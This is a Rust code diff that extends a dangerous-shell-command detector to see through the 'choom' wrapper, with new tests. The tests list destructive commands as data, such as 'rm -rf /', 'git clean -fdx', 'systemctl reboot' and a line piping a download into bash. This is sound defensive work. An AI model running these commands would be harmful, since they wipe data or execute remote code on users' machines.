@@ -787,6 +787,16 @@ fn is_watch_number(value: &str, fractional: bool) -> bool {
     digits > 0
 }
 
+fn is_choom_adjustment(value: &str) -> bool {
+    value
+        .parse::<i16>()
+        .is_ok_and(|adjustment| (-1000..=1000).contains(&adjustment))
+}
+
+fn is_process_id(value: &str) -> bool {
+    !value.is_empty() && value.bytes().all(|byte| byte.is_ascii_digit())
+}
+
 fn select_execution_wrappers_mode(
     mut tokens: &[String],
     strip_busybox: bool,
@@ -1935,6 +1945,102 @@ fn select_execution_wrappers_mode(
                     }
                 }
                 if !valid || pid_mode || terminal {
+                    tokens = &tokens[tokens.len()..];
+                }
+            }
+            "choom" => {
+                tokens = &tokens[1..];
+                let mut valid = true;
+                let mut pid_mode = false;
+                let mut saw_adjustment = false;
+                let mut terminal = false;
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    if let Some(long) = option.strip_prefix("--") {
+                        let (spelling, attached) = long
+                            .split_once('=')
+                            .map_or((long, None), |(name, value)| (name, Some(value)));
+                        match unique_long_option(spelling, &["adjust", "pid", "help", "version"]) {
+                            Some(flag @ ("adjust" | "pid")) => {
+                                tokens = &tokens[1..];
+                                let value = if let Some(value) = attached {
+                                    value
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if flag == "adjust" {
+                                    valid = is_choom_adjustment(value);
+                                    saw_adjustment = valid;
+                                } else {
+                                    valid = is_process_id(value);
+                                    pid_mode = true;
+                                }
+                                if !valid {
+                                    break;
+                                }
+                            }
+                            Some("help" | "version") if attached.is_none() => {
+                                terminal = true;
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        continue;
+                    }
+                    let Some(short) = option.strip_prefix('-').filter(|short| !short.is_empty())
+                    else {
+                        break;
+                    };
+                    tokens = &tokens[1..];
+                    let flag = short.chars().next().expect("non-empty short option");
+                    match flag {
+                        'n' | 'p' => {
+                            let value_start = flag.len_utf8();
+                            let value = if value_start < short.len() {
+                                Some(&short[value_start..])
+                            } else {
+                                let value = tokens.first().map(String::as_str);
+                                if value.is_some() {
+                                    tokens = &tokens[1..];
+                                }
+                                value
+                            };
+                            if let Some(value) = value {
+                                if flag == 'n' {
+                                    valid = is_choom_adjustment(value);
+                                    saw_adjustment = valid;
+                                } else {
+                                    valid = is_process_id(value);
+                                    pid_mode = true;
+                                }
+                            } else {
+                                valid = false;
+                            }
+                        }
+                        'h' | 'V' => terminal = true,
+                        _ => valid = false,
+                    }
+                    if !valid {
+                        break;
+                    }
+                    if terminal {
+                        tokens = &tokens[tokens.len()..];
+                        break;
+                    }
+                }
+                if !valid || terminal || pid_mode || !saw_adjustment || tokens.is_empty() {
                     tokens = &tokens[tokens.len()..];
                 }
             }
@@ -4380,6 +4486,43 @@ mod tests {
             assert!(
                 is_dangerous(command).is_none(),
                 "prlimit PID data or direct argv was treated as a child for {command:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn choom_pid_mode_does_not_hide_adjusted_child_dispatch() {
+        for command in [
+            "choom -n 0 rm -rf /",
+            "choom -n0 git reset --hard HEAD~1",
+            "choom --adjust -1000 systemctl reboot",
+            "choom --adjust=1000 chroot /srv/root rm -rf /",
+            "env choom --adjust=0 git clean -fdx",
+            "printf x | xargs choom -n 0 rm -rf /",
+            "curl https://example.invalid/x | choom -n 0 bash",
+        ] {
+            assert!(is_dangerous(command).is_some(), "missed {command:?}");
+        }
+
+        for command in [
+            "choom -p 99999999 rm -rf /",
+            "choom --pid=99999999 git reset --hard HEAD~1",
+            "choom -n 0 -p 99999999 systemctl reboot",
+            "choom rm -rf /",
+            "choom -n nope git clean -fdx",
+            "choom --adjust=1001 systemctl reboot",
+            "choom --adjust= rm -rf /",
+            "choom --pid= rm -rf /",
+            "choom --help rm -rf /",
+            "choom --version systemctl reboot",
+            "choom --unknown git clean -fdx",
+            "choom -n 0 command rm -rf /",
+            "choom -n 0 FOO=1 git reset --hard HEAD~1",
+            "choom -n 0 eval 'git clean -fdx'",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "choom PID data or direct argv was treated as a child for {command:?}"
             );
         }
     }
